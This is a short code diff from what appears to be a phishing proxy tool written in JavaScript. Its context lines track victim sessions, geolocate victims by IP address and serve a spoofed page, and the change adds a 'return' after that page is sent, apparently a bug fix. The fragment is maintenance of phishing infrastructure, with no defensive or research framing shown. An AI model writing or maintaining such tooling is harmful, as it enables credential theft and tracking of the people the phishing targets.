@@ -289,6 +289,7 @@ getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            return;
         }
         catch (error) {
             displayError("Phishing URL parsing failed", error, url);
